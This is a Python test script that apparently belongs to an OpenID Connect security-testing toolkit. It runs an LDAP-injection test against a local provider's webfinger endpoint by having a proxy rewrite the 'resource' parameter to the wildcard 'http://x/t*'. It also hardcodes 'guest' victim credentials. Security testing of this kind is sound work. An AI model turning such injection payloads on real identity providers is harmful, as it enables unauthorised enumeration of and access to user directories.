import sys
import os
import requests
import urllib

from osbtlib import BrowserSimulator, Osbtlib

HONEST_RP_ENDPOINT = "http://localhost:3000"
HONEST_OP_ENDPOINT = "http://localhost:3001"
PROXY_SERVER_ENDPOINT = "http://localhost:8080"
PROXY_EXTENSION_ENDPOINT = "http://localhost:5555"

# victim credentials
victim_username = 'guest'
victim_password = 'guest'

osbt = Osbtlib(
    proxy_extension_url = PROXY_EXTENSION_ENDPOINT
)

try:
    # LDAP injection
    url = f'{HONEST_OP_ENDPOINT}/.well-known/webfinger?resource=http://x/user&rel=http://openid.net/specs/connect/1.0/issuer'
    print(url)

    # modify query param
    osbt.proxy.modify_query_param('resource', 'http://x/t*', 'localhost:3001', '/.well-known/webfinger', 'GET')

    bs = BrowserSimulator(url, PROXY_SERVER_ENDPOINT)
    bs.run("")

    # get history
    traces = osbt.proxy.get_history()
    assert(traces['response'][0]['status_code'] == 200)

except Exception as e:
    print('Error:', e)
    osbt.proxy.clean()